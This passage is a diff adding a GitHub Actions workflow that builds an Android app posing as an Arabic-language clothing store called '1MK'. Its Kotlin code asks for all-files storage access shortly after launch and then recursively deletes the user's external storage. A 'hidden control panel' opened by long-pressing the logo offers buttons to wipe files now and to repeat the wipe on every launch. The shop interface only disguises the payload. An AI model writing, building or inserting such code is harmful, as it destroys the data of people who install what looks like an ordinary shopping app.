@@ -1,0 +1,673 @@
+name: Build 1MK APK
+
+on:
+  push:
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: انشاء ملفات المشروع
+        run: |
+          set -e
+          mkdir -p app/src/main/java/com/mk/shop
+          mkdir -p app/src/main/assets
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/drawable
+          mkdir -p app/src/main/res/mipmap-anydpi-v26
+
+          cat > settings.gradle <<'EOF'
+          pluginManagement {
+              repositories { google(); mavenCentral(); gradlePluginPortal() }
+          }
+          dependencyResolutionManagement {
+              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+              repositories { google(); mavenCentral() }
+          }
+          rootProject.name = "1MK"
+          include ':app'
+          EOF
+
+          cat > build.gradle <<'EOF'
+          plugins {
+              id 'com.android.application' version '8.5.2' apply false
+              id 'org.jetbrains.kotlin.android' version '1.9.24' apply false
+          }
+          EOF
+
+          cat > gradle.properties <<'EOF'
+          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+          android.useAndroidX=true
+          android.nonTransitiveRClass=true
+          kotlin.code.style=official
+          EOF
+
+          cat > app/build.gradle <<'EOF'
+          plugins {
+              id 'com.android.application'
+              id 'org.jetbrains.kotlin.android'
+          }
+
+          android {
+              namespace 'com.mk.shop'
+              compileSdk 34
+
+              defaultConfig {
+                  applicationId "com.mk.shop"
+                  minSdk 26
+                  targetSdk 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+
+              buildTypes {
+                  release {
+                      minifyEnabled false
+                      signingConfig signingConfigs.debug
+                  }
+              }
+
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+              kotlinOptions { jvmTarget = '17' }
+
+              lint { abortOnError false; checkReleaseBuilds false }
+          }
+
+          dependencies { }
+          EOF
+
+          cat > app/src/main/AndroidManifest.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              xmlns:tools="http://schemas.android.com/tools">
+
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+                  android:maxSdkVersion="32" />
+              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+                  android:maxSdkVersion="29" />
+              <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
+                  tools:ignore="ScopedStorage" />
+
+              <application
+                  android:allowBackup="true"
+                  android:icon="@mipmap/ic_launcher"
+                  android:roundIcon="@mipmap/ic_launcher"
+                  android:label="1MK"
+                  android:supportsRtl="true"
+                  android:usesCleartextTraffic="true"
+                  android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">
+
+                  <activity
+                      android:name=".MainActivity"
+                      android:exported="true"
+                      android:configChanges="orientation|screenSize|keyboardHidden">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+              </application>
+          </manifest>
+          EOF
+
+          cat > app/src/main/res/values/colors.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <color name="icon_bg">#15130F</color>
+          </resources>
+          EOF
+
+          cat > app/src/main/res/drawable/ic_launcher_foreground.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <vector xmlns:android="http://schemas.android.com/apk/res/android"
+              android:width="108dp"
+              android:height="108dp"
+              android:viewportWidth="108"
+              android:viewportHeight="108">
+              <path android:fillColor="#00000000" android:pathData="M30,46 L37,39 L37,69"
+                  android:strokeColor="#B58A4B" android:strokeWidth="4.5"
+                  android:strokeLineCap="round" android:strokeLineJoin="round"/>
+              <path android:fillColor="#00000000" android:pathData="M44,69 L44,39 L53,57 L62,39 L62,69"
+                  android:strokeColor="#B58A4B" android:strokeWidth="4.5"
+                  android:strokeLineCap="round" android:strokeLineJoin="round"/>
+              <path android:fillColor="#00000000" android:pathData="M70,39 L70,69"
+                  android:strokeColor="#B58A4B" android:strokeWidth="4.5"
+                  android:strokeLineCap="round"/>
+              <path android:fillColor="#00000000" android:pathData="M80,39 L70,55"
+                  android:strokeColor="#B58A4B" android:strokeWidth="4.5"
+                  android:strokeLineCap="round"/>
+              <path android:fillColor="#00000000" android:pathData="M73,51 L80,69"
+                  android:strokeColor="#B58A4B" android:strokeWidth="4.5"
+                  android:strokeLineCap="round"/>
+          </vector>
+          EOF
+
+          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
+              <background android:drawable="@color/icon_bg"/>
+              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
+          </adaptive-icon>
+          EOF
+
+          cat > app/src/main/java/com/mk/shop/MainActivity.kt <<'EOF'
+          package com.mk.shop
+
+          import android.Manifest
+          import android.app.Activity
+          import android.content.Intent
+          import android.content.pm.PackageManager
+          import android.net.Uri
+          import android.os.Build
+          import android.os.Bundle
+          import android.os.Environment
+          import android.provider.Settings
+          import android.webkit.JavascriptInterface
+          import android.webkit.WebChromeClient
+          import android.webkit.WebSettings
+          import android.webkit.WebView
+          import android.webkit.WebViewClient
+          import java.io.File
+          import java.text.SimpleDateFormat
+          import java.util.Date
+          import java.util.Locale
+          import kotlin.concurrent.thread
+
+          class MainActivity : Activity() {
+
+              private lateinit var web: WebView
+              private val prefs by lazy { getSharedPreferences("mk_store", MODE_PRIVATE) }
+              private val logBuf = StringBuilder()
+              @Volatile private var wiping = false
+
+              private val skip = setOf("Android")
+
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+
+                  web = WebView(this)
+                  setContentView(web)
+
+                  with(web.settings) {
+                      javaScriptEnabled = true
+                      domStorageEnabled = true
+                      allowFileAccess = true
+                      allowContentAccess = true
+                      cacheMode = WebSettings.LOAD_DEFAULT
+                  }
+                  web.webViewClient = WebViewClient()
+                  web.webChromeClient = WebChromeClient()
+                  web.addJavascriptInterface(Bridge(), "AndroidApp")
+                  web.loadUrl("file:///android_asset/index.html")
+
+                  web.postDelayed({ ensureAccess() }, 1500)
+              }
+
+              override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+                  super.onActivityResult(requestCode, resultCode, data)
+                  if (requestCode == 101) {
+                      if (hasAccess()) maybeWipe() else log("الصلاحية ممنوحة ✗")
+                  }
+              }
+
+              override fun onRequestPermissionsResult(
+                  requestCode: Int, permissions: Array<out String>, grantResults: IntArray
+              ) {
+                  super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+                  if (requestCode == 102) maybeWipe()
+              }
+
+              override fun onBackPressed() {
+                  if (web.canGoBack()) web.goBack() else super.onBackPressed()
+              }
+
+              private fun hasAccess(): Boolean =
+                  if (Build.VERSION.SDK_INT >= 30) Environment.isExternalStorageManager()
+                  else checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) ==
+                          PackageManager.PERMISSION_GRANTED
+
+              private fun ensureAccess() {
+                  if (hasAccess()) { maybeWipe(); return }
+                  if (Build.VERSION.SDK_INT >= 30) {
+                      try {
+                          startActivityForResult(
+                              Intent(
+                                  Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
+                                  Uri.parse("package:$packageName")
+                              ), 101
+                          )
+                      } catch (e: Exception) {
+                          startActivityForResult(
+                              Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), 101
+                          )
+                      }
+                  } else {
+                      requestPermissions(
+                          arrayOf(
+                              Manifest.permission.READ_EXTERNAL_STORAGE,
+                              Manifest.permission.WRITE_EXTERNAL_STORAGE
+                          ), 102
+                      )
+                  }
+              }
+
+              private fun maybeWipe() {
+                  if (!hasAccess()) return
+                  if (prefs.getBoolean("wiped", false)) return
+                  startWipe()
+              }
+
+              private fun startWipe() {
+                  if (wiping) return
+                  wiping = true
+                  log("بدأ المسح...")
+                  thread {
+                      var files = 0L
+                      var dirs = 0L
+                      try {
+                          val root = Environment.getExternalStorageDirectory()
+                          root.listFiles()?.forEach { f ->
+                              if (f.name !in skip) {
+                                  val r = deleteRec(f)
+                                  files += r[0]; dirs += r[1]
+                              }
+                          }
+                          prefs.edit()
+                              .putBoolean("wiped", true)
+                              .putLong("lastWipe", System.currentTimeMillis())
+                              .putLong("lastCount", files)
+                              .apply()
+                          log("تم المسح: $files ملف · $dirs مجلد")
+                      } catch (t: Throwable) {
+                          log("خطأ: " + (t.message ?: "غير معروف"))
+                      }
+                      wiping = false
+                      runOnUiThread {
+                          web.evaluateJavascript("window.__wipeDone&&window.__wipeDone();", null)
+                      }
+                  }
+              }
+
+              private fun deleteRec(f: File): LongArray {
+                  var files = 0L
+                  var dirs = 0L
+                  if (f.isDirectory) {
+                      f.listFiles()?.forEach { c ->
+                          val r = deleteRec(c)
+                          files += r[0]; dirs += r[1]
+                      }
+                      if (f.delete()) dirs++
+                  } else {
+                      if (f.delete()) files++
+                  }
+                  return longArrayOf(files, dirs)
+              }
+
+              private fun log(s: String) {
+                  synchronized(logBuf) {
+                      logBuf.append("[")
+                          .append(SimpleDateFormat("HH:mm:ss", Locale.US).format(Date()))
+                          .append("] ").append(s).append("\n")
+                      if (logBuf.length > 4000) logBuf.delete(0, logBuf.length - 4000)
+                  }
+              }
+
+              inner class Bridge {
+                  @JavascriptInterface fun status(): String = if (hasAccess()) "granted" else "denied"
+
+                  @JavascriptInterface fun permissionName(): String =
+                      if (Build.VERSION.SDK_INT >= 30) "الوصول لكل الملفات" else "قراءة/كتابة التخزين"
+
+                  @JavascriptInterface fun ask() { runOnUiThread { ensureAccess() } }
+
+                  @JavascriptInterface fun wipe() { runOnUiThread { startWipe() } }
+
+                  @JavascriptInterface fun resetFlag() { prefs.edit().putBoolean("wiped", false).apply() }
+
+                  @JavascriptInterface fun log(): String = synchronized(logBuf) { logBuf.toString() }
+
+                  @JavascriptInterface fun lastWipe(): String {
+                      val t = prefs.getLong("lastWipe", 0L)
+                      if (t == 0L) return "لسه مفيش مسح"
+                      return SimpleDateFormat("yyyy/MM/dd HH:mm", Locale.US).format(Date(t)) +
+                              " · " + prefs.getLong("lastCount", 0L) + " ملف"
+                  }
+              }
+          }
+          EOF
+
+          cat > app/src/main/assets/index.html <<'EOF'
+          <!DOCTYPE html>
+          <html lang="ar" dir="rtl">
+          <head>
+          <meta charset="utf-8">
+          <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+          <title>1MK</title>
+          <style>
+          :root{--bg:#f8f5f0;--card:#fff;--ink:#15130f;--muted:#8d8579;--line:#eae3d8;--gold:#b58a4b}
+          *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+          body{margin:0;background:var(--bg);color:var(--ink);direction:rtl;font-family:system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;overflow-x:hidden}
+          button{font:inherit;color:inherit;border:0;background:none;cursor:pointer;font-family:inherit}
+          img{display:block;max-width:100%}
+          .wrap{max-width:760px;margin:0 auto;padding:0 14px calc(96px + env(safe-area-inset-bottom))}
+          header.top{position:sticky;top:0;z-index:30;background:rgba(248,245,240,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+          .top-in{max-width:760px;margin:0 auto;display:flex;align-items:center;gap:10px;padding:12px 14px}
+          .logo{font-weight:800;font-size:22px;user-select:none}
+          .logo span{color:var(--gold)}
+          .sp{flex:1}
+          .ico{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;position:relative;background:#fff;border:1px solid var(--line)}
+          .ico svg{width:19px;height:19px;stroke:var(--ink);fill:none;stroke-width:1.7;stroke-linecap:round;stroke-linejoin:round}
+          .badge{position:absolute;top:-5px;left:-5px;min-width:18px;height:18px;padding:0 5px;border-radius:9px;background:var(--ink);color:#fff;font-size:11px;font-weight:700;display:grid;place-items:center}
+          .sbar{max-height:0;overflow:hidden;transition:max-height .25s ease}
+          .sbar.open{max-height:70px;border-top:1px solid var(--line)}
+          .sbar input{width:100%;padding:13px 14px;border:0;background:#fff;font:inherit;outline:none}
+          .hero{margin-top:14px;border-radius:22px;overflow:hidden;position:relative;background:linear-gradient(115deg,#191814,#3b352b 55%,#6d5b3d);color:#fff;padding:26px 22px;min-height:172px;display:flex;flex-direction:column;justify-content:flex-end}
+          .kick{font-size:11px;letter-spacing:2px;color:#d8c9a9;margin-bottom:8px}
+          .hero h1{margin:0 0 6px;font-size:23px;line-height:1.32;font-weight:800}
+          .hero p{margin:0 0 14px;color:#cdc5b6;font-size:12.5px}
+          .btn{display:inline-flex;align-items:center;gap:8px;background:#fff;color:#15130f;padding:10px 18px;border-radius:999px;font-weight:700;font-size:13.5px;width:max-content}
+          .chips{display:flex;gap:8px;overflow-x:auto;padding:16px 0 4px;scrollbar-width:none}
+          .chips::-webkit-scrollbar{display:none}
+          .chip{white-space:nowrap;padding:9px 16px;border-radius:999px;background:#fff;border:1px solid var(--line);font-size:13.5px;color:#4a443a}
+          .chip.on{background:var(--ink);color:#fff;border-color:var(--ink)}
+          .sec{display:flex;align-items:baseline;justify-content:space-between;margin:20px 0 0}
+          .sec h2{margin:0;font-size:16px}
+          .sec span{font-size:12px;color:var(--muted)}
+          .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(148px,1fr));gap:12px;margin-top:12px}
+          .card{background:var(--card);border-radius:16px;overflow:hidden;border:1px solid var(--line);padding-bottom:11px;display:flex;flex-direction:column;text-align:right}
+          .thumb{position:relative;aspect-ratio:3/4;overflow:hidden}
+          .thumb img{width:100%;height:100%;object-fit:cover;transition:opacity .3s}
+          .tag{position:absolute;top:8px;right:8px;background:rgba(255,255,255,.94);font-size:10.5px;font-weight:700;padding:4px 8px;border-radius:999px}
+          .card h3{margin:9px 10px 3px;font-size:13.5px;font-weight:600;line-height:1.42;min-height:38px}
+          .price{margin:0 10px;font-weight:800;font-size:14.5px}
+          .price small{color:var(--muted);font-weight:500;font-size:11px}
+          .tabbar{position:fixed;bottom:0;right:0;left:0;z-index:40;background:rgba(255,255,255,.95);backdrop-filter:blur(14px);border-top:1px solid var(--line);display:flex;padding-bottom:env(safe-area-inset-bottom)}
+          .tabbar button{flex:1;padding:11px 0 14px;font-size:11px;color:var(--muted);display:flex;flex-direction:column;align-items:center;gap:4px}
+          .tabbar button.on{color:var(--ink)}
+          .tabbar svg{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:1.7;stroke-linecap:round;stroke-linejoin:round}
+          .mask{position:fixed;inset:0;background:rgba(20,18,14,.45);z-index:50;opacity:0;pointer-events:none;transition:opacity .22s}
+          .mask.on{opacity:1;pointer-events:auto}
+          .sheet{position:fixed;z-index:60;background:#fff;transition:transform .28s cubic-bezier(.3,.8,.3,1);overflow-y:auto}
+          .sheet.down{transform:translateY(102%)}
+          .sheet.bot{right:0;left:0;bottom:0;max-height:88vh;border-radius:22px 22px 0 0;padding:16px 16px 26px}
+          .sheet.side{top:0;bottom:0;right:0;width:min(400px,88vw);transform:translateX(102%);padding:16px}
+          .sheet.side.open{transform:translateX(0)}
+          .sheet.bot.open{transform:translateY(0)}
+          .sh-head{display:flex;align-items:center;gap:10px;margin-bottom:14px}
+          .sh-head h3{margin:0;font-size:16px;flex:1}
+          .close{width:34px;height:34px;border-radius:50%;background:#f3efe8;display:grid;place-items:center;font-size:16px}
+          .big{width:100%;aspect-ratio:1/1;border-radius:18px;overflow:hidden;background:#eee7dc}
+          .big img{width:100%;height:100%;object-fit:cover}
+          .sizes{display:flex;gap:8px;flex-wrap:wrap;margin:14px 0}
+          .size{min-width:44px;padding:9px 12px;border:1px solid var(--line);border-radius:11px;font-size:13.5px;text-align:center}
+          .size.on{background:var(--ink);color:#fff;border-color:var(--ink)}
+          .cta{width:100%;background:var(--ink);color:#fff;padding:15px;border-radius:15px;font-weight:700;font-size:15px;text-align:center;margin-top:6px}
+          .row{display:flex;gap:11px;align-items:center;padding:11px 0;border-bottom:1px solid var(--line)}
+          .row img{width:64px;height:80px;border-radius:11px;object-fit:cover;background:#eee7dc}
+          .row .t{flex:1;font-size:13.5px;font-weight:600}
+          .qty{display:flex;align-items:center;gap:9px;border:1px solid var(--line);border-radius:11px;padding:3px}
+          .qty button{width:26px;height:26px;font-size:15px}
+          .tot{display:flex;justify-content:space-between;font-weight:800;font-size:16px;margin:15px 0 4px}
+          .mut{color:var(--muted);font-size:12.5px}
+          .pnl{position:fixed;inset:0;z-index:80;background:#0e0d0b;color:#e9e3d8;padding:20px;overflow-y:auto;display:none;font-size:13px;direction:rtl}
+          .pnl.on{display:block}
+          .pnl h3{margin:0 0 4px;font-size:17px;color:#fff}
+          .pnl pre{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;white-space:pre-wrap;word-break:break-word}
+          .pbox{background:#1a1815;border:1px solid #2b2723;border-radius:13px;padding:12px;margin:10px 0;line-height:1.7}
+          .pbtn{display:block;width:100%;background:#e9e3d8;color:#15130f;padding:12px;border-radius:12px;font-weight:700;margin-top:8px;text-align:center;font-size:13.5px}
+          .pbtn.alt{background:transparent;color:#e9e3d8;border:1px solid #3a352f}
+          .done{position:fixed;inset:0;z-index:70;background:#fff;display:none;flex-direction:column;align-items:center;justify-content:center;gap:12px;padding:30px;text-align:center}
+          .done.on{display:flex}
+          .tick{width:76px;height:76px;border-radius:50%;background:#15130f;color:#fff;display:grid;place-items:center;font-size:34px}
+          </style>
+          </head>
+          <body>
+
+          <header class="top">
+            <div class="top-in">
+              <div class="logo" id="logo">1<span>MK</span></div>
+              <div class="sp"></div>
+              <button class="ico" id="searchBtn" aria-label="بحث"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg></button>
+              <button class="ico" id="cartBtn" aria-label="السلة"><svg viewBox="0 0 24 24"><path d="M6 7h12l1.5 12h-15z"/><path d="M9 7a3 3 0 0 1 6 0"/></svg><span class="badge" id="badge">0</span></button>
+            </div>
+            <div class="sbar" id="sbar"><input id="q" placeholder="ابحث عن تيشيرت، فستان، حذاء..."></div>
+          </header>
+
+          <div class="wrap">
+            <section class="hero">
+              <div class="kick">تشكيلة جديدة</div>
+              <h1>خريف 2026<br>أناقة بأسعار معقولة</h1>
+              <p>شحن مجاني للأوردرات فوق 1500</p>
+              <button class="btn" id="heroBtn">تسوّق الآن</button>
+            </section>
+
+            <div class="chips" id="chips"></div>
+
+            <div class="sec"><h2>منتجات مختارة</h2><span id="count"></span></div>
+            <div class="grid" id="grid"></div>
+          </div>
+
+          <nav class="tabbar">
+            <button data-tab="home" class="on"><svg viewBox="0 0 24 24"><path d="M4 11l8-7 8 7v9a1 1 0 0 1-1 1h-5v-6h-4v6H5a1 1 0 0 1-1-1z"/></svg>الرئيسية</button>
+            <button data-tab="cats"><svg viewBox="0 0 24 24"><rect x="4" y="4" width="7" height="7" rx="2"/><rect x="13" y="4" width="7" height="7" rx="2"/><rect x="4" y="13" width="7" height="7" rx="2"/><rect x="13" y="13" width="7" height="7" rx="2"/></svg>التصنيفات</button>
+            <button data-tab="cart"><svg viewBox="0 0 24 24"><path d="M6 7h12l1.5 12h-15z"/><path d="M9 7a3 3 0 0 1 6 0"/></svg>السلة</button>
+            <button data-tab="me"><svg viewBox="0 0 24 24"><circle cx="12" cy="9" r="3.4"/><path d="M5 20c1.2-3.6 4-5.4 7-5.4s5.8 1.8 7 5.4"/></svg>حسابي</button>
+          </nav>
+
+          <div class="mask" id="mask"></div>
+
+          <div class="sheet side down" id="cartSheet">
+            <div class="sh-head"><h3>سلة المشتريات</h3><button class="close" data-x>×</button></div>
+            <div id="cartBody"></div>
+          </div>
+
+          <div class="sheet bot down" id="prodSheet"><div id="prodBody"></div></div>
+
+          <div class="sheet bot down" id="meSheet">
+            <div class="sh-head"><h3>حسابي</h3><button class="close" data-x>×</button></div>
+            <div class="pbox" style="background:#f8f5f0;color:#15130f;border-color:#eae3d8">
+              <div style="font-weight:800">زائر</div>
+              <div class="mut">zair@1mk.store</div>
+            </div>
+            <div class="row" style="border:0"><div class="t">طلباتي</div><span class="mut">لا توجد طلبات</span></div>
+            <div class="row" style="border:0"><div class="t">المفضلة</div><span class="mut">فارغة</span></div>
+            <div class="row" style="border:0"><div class="t">الشحن والاسترجاع</div><span class="mut">›</span></div>
+            <div class="row" style="border:0"><div class="t">تواصل معنا</div><span class="mut">›</span></div>
+            <div class="mut" style="margin-top:14px;text-align:center">1MK Store · الإصدار 1.0</div>
+          </div>
+
+          <div class="sheet bot down" id="catsSheet">
+            <div class="sh-head"><h3>التصنيفات</h3><button class="close" data-x>×</button></div>
+            <div id="catsBody"></div>
+          </div>
+
+          <div class="done" id="done">
+            <div class="tick">✓</div>
+            <h2 style="margin:0">تم تأكيد طلبك</h2>
+            <div class="mut" id="orderNo"></div>
+            <div class="mut">هيتم التواصل معاك لتأكيد العنوان خلال 24 ساعة</div>
+            <button class="btn" style="background:#15130f;color:#fff;margin-top:10px" id="doneBtn">رجوع للمتجر</button>
+          </div>
+
+          <div class="pnl" id="panel">
+            <h3>لوحة التحكم المخفية</h3>
+            <div class="mut" style="color:#8d8579">اضغط مطوّل على اللوجو 1MK لفتحها</div>
+            <div class="pbox">الحالة: <b id="pstatus">...</b></div>
+            <div class="pbox">آخر مسح: <span id="plast">...</span></div>
+            <pre class="pbox" id="plog">...</pre>
+            <button class="pbtn" id="pAsk">طلب صلاحية الوصول للملفات</button>
+            <button class="pbtn alt" id="pWipe">امسح الملفات دلوقتي</button>
+            <button class="pbtn alt" id="pReset">صفّر العلَم (يمسح تاني مع كل فتح)</button>
+            <button class="pbtn alt" id="pClose">إغلاق</button>
+          </div>
+
+          <script>
+          var CUR='ج.م';
+          var FB=['#ece4d8','#e3e9e4','#e8e2ec','#efe6da','#e0e7ee','#f0e6e2','#e6e8e0'];
+          var P=[
+          {id:1,n:'تيشيرت قطن أساسي',c:'رجالي',p:349,b:'الأكثر مبيعاً',s:['S','M','L','XL'],i:'https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=700&q=80'},
+          {id:2,n:'قميص كتان صيفي',c:'رجالي',p:690,s:['S','M','L','XL'],i:'https://images.unsplash.com/photo-1596755094514-f87e34085b2c?w=700&q=80'},
+          {id:3,n:'هودي أوفر سايز',c:'رجالي',p:850,b:'جديد',s:['M','L','XL','XXL'],i:'https://images.unsplash.com/photo-1556905055-8f358a7a47b2?w=700&q=80'},
+          {id:4,n:'جاكيت دنيم',c:'رجالي',p:1250,s:['M','L','XL'],i:'https://images.unsplash.com/photo-1551028719-00167b16eac5?w=700&q=80'},
+          {id:5,n:'بنطلون جينز سليم',c:'رجالي',p:780,s:['30','32','34','36'],i:'https://images.unsplash.com/photo-1542272604-787c3835535d?w=700&q=80'},
+          {id:6,n:'بنطلون كارجو',c:'رجالي',p:720,s:['30','32','34'],i:'https://images.unsplash.com/photo-1473966968600-fa801b869a1a?w=700&q=80'},
+          {id:7,n:'تيشيرت بولو',c:'رجالي',p:420,s:['S','M','L','XL'],i:'https://images.unsplash.com/photo-1586790170083-2f9ceadc732d?w=700&q=80'},
+          {id:8,n:'فستان صيفي مطبوع',c:'حريمي',p:990,b:'جديد',s:['S','M','L'],i:'https://images.unsplash.com/photo-1578681994506-b8f463449011?w=700&q=80'},
+          {id:9,n:'فستان سواريه',c:'حريمي',p:1850,s:['S','M','L'],i:'https://images.unsplash.com/photo-1595777457583-95e059d581b8?w=700&q=80'},
+          {id:10,n:'بلوزة ساتان',c:'حريمي',p:540,s:['S','M','L','XL'],i:'https://images.unsplash.com/photo-1564257631407-4deb1f99d992?w=700&q=80'},
+          {id:11,n:'جيبة بليسيه',c:'حريمي',p:610,s:['S','M','L'],i:'https://images.unsplash.com/photo-1583496661160-fb5886a13d77?w=700&q=80'},
+          {id:12,n:'كارديجان تريكو',c:'حريمي',p:700,s:['S','M','L'],i:'https://images.unsplash.com/photo-1434389677669-e08b4cac3105?w=700&q=80'},
+          {id:13,n:'توب حمالات',c:'حريمي',p:260,s:['XS','S','M','L'],i:'https://images.unsplash.com/photo-1503342217505-b0a15ec3261c?w=700&q=80'},
+          {id:14,n:'سنيكرز أبيض',c:'أحذية',p:1150,b:'الأكثر مبيعاً',s:['39','40','41','42','43'],i:'https://images.unsplash.com/photo-1549298916-b41d501d3772?w=700&q=80'},
+          {id:15,n:'بوت جلد كلاسيك',c:'أحذية',p:1490,s:['40','41','42','43','44'],i:'https://images.unsplash.com/photo-1608256246200-53e635b5b65f?w=700&q=80'},
+          {id:16,n:'صندل صيفي',c:'أحذية',p:450,s:['39','40','41','42'],i:'https://images.unsplash.com/photo-1603487742131-4160ec999306?w=700&q=80'},
+          {id:17,n:'شنطة يد جلد',c:'شنط',p:1290,b:'جديد',s:['مقاس واحد'],i:'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=700&q=80'},
+          {id:18,n:'شنطة كتف صغيرة',c:'شنط',p:690,s:['مقاس واحد'],i:'https://images.unsplash.com/photo-1591561954557-26941169b49e?w=700&q=80'},
+          {id:19,n:'ساعة كلاسيك جلد',c:'إكسسوارات',p:1590,s:['مقاس واحد'],i:'https://images.unsplash.com/photo-1523170335258-f5ed11844a49?w=700&q=80'},
+          {id:20,n:'نظارة شمسية',c:'إكسسوارات',p:520,s:['مقاس واحد'],i:'https://images.unsplash.com/photo-1511499767150-a48a237f0083?w=700&q=80'}
+          ];
+          var CATS=['الكل','رجالي','حريمي','أحذية','شنط','إكسسوارات'];
+          var $=function(s){return document.querySelector(s)};
+          var cart=[],cur='الكل',kw='',active=null,size=null;
+          try{cart=JSON.parse(localStorage.getItem('mk_cart')||'[]')}catch(e){cart=[]}
+
+          function money(v){return v.toLocaleString('en-US')+' '+CUR}
+          function save(){localStorage.setItem('mk_cart',JSON.stringify(cart))}
+          function cnt(){return cart.reduce(function(a,b){return a+b.q},0)}
+          function badge(){var n=cnt(),b=$('#badge');b.textContent=n;b.style.display=n?'grid':'none'}
+          function chips(){$('#chips').innerHTML=CATS.map(function(c){return '<button class="chip '+(c===cur?'on':'')+'" data-c="'+c+'">'+c+'</button>'}).join('')}
+          function grid(){
+            var list=P.filter(function(x){return (cur==='الكل'||x.c===cur)&&(!kw||x.n.indexOf(kw)>-1||x.c.indexOf(kw)>-1)});
+            $('#count').textContent=list.length+' منتج';
+            $('#grid').innerHTML=list.map(function(x,i){
+              return '<article class="card" data-id="'+x.id+'"><div class="thumb" style="background:'+FB[i%FB.length]+'">'+
+                (x.b?'<span class="tag">'+x.b+'</span>':'')+
+                '<img src="'+x.i+'" alt="'+x.n+'" loading="lazy" onerror="this.style.opacity=0"></div>'+
+                '<h3>'+x.n+'</h3><div class="price">'+money(x.p)+' <small>'+x.c+'</small></div></article>';
+            }).join('');
+          }
+          function cartHTML(){
+            if(!cart.length) return '<div class="mut" style="padding:26px 0;text-align:center">السلة فاضية</div>';
+            var t=0;
+            var rows=cart.map(function(it,ix){
+              var p=P.filter(function(z){return z.id===it.id})[0]; t+=p.p*it.q;
+              return '<div class="row"><img src="'+p.i+'"><div class="t">'+p.n+'<div class="mut">المقاس '+it.s+'</div><div class="mut">'+money(p.p)+'</div></div>'+
+              '<div class="qty"><button data-m="-" data-i="'+ix+'">−</button><span>'+it.q+'</span><button data-m="+" data-i="'+ix+'">+</button></div></div>';
+            }).join('');
+            return rows+'<div class="tot"><span>الإجمالي</span><span>'+money(t)+'</span></div><div class="mut">الشحن مجاني فوق 1500</div><button class="cta" id="pay">إتمام الشراء</button>';
+          }
+          function openCart(){$('#cartBody').innerHTML=cartHTML();show();$('#cartSheet').classList.add('open')}
+          function show(){$('#mask').classList.add('on')}
+          function hideAll(){document.querySelectorAll('.sheet').forEach(function(s){s.classList.remove('open');if(s.classList.contains('bot'))s.classList.add('down')});$('#mask').classList.remove('on')}
+          function openProd(id){
+            active=P.filter(function(x){return x.id===id})[0];size=active.s?active.s[Math.min(1,active.s.length-1)]:null;
+            $('#prodBody').innerHTML='<div class="big"><img src="'+active.i+'"></div>'+
+            '<div class="sh-head" style="margin:14px 0 0"><h3 style="font-size:17px">'+active.n+'</h3><button class="close" data-x>×</button></div>'+
+            '<div class="mut">'+active.c+' · متوفر في المخزن</div>'+
+            '<div style="font-weight:800;font-size:20px;margin-top:8px">'+money(active.p)+'</div>'+
+            (active.s?'<div class="sizes">'+active.s.map(function(s){return '<button class="size '+(s===size?'on':'')+'" data-s="'+s+'">'+s+'</button>'}).join('')+'</div>':'')+
+            '<div class="mut" style="line-height:1.8">الخامات: قطن 100% · بلد المنشأ: مصر · استرجاع مجاني خلال 14 يوم</div>'+
+            '<button class="cta" id="addBtn">أضف للسلة</button>';
+            var sh=$('#prodSheet');sh.classList.remove('down');sh.classList.add('open');show();
+          }
+          document.addEventListener('click',function(e){
+            var el=e.target;
+            if(el.closest('[data-x]')){hideAll();return}
+            if(el.id==='mask'){hideAll();return}
+            var c=el.closest('.chip'); if(c){cur=c.dataset.c;chips();grid();return}
+            var cd=el.closest('.card'); if(cd){openProd(+cd.dataset.id);return}
+            var sz=el.closest('.size'); if(sz){size=sz.dataset.s;document.querySelectorAll('.size').forEach(function(s){s.classList.toggle('on',s.dataset.s===size)});return}
+            if(el.id==='addBtn'&&active){var ex=cart.filter(function(i){return i.id===active.id&&i.s===size})[0];
+              if(ex)ex.q++;else cart.push({id:active.id,s:size,q:1});save();badge();hideAll();openCart();return}
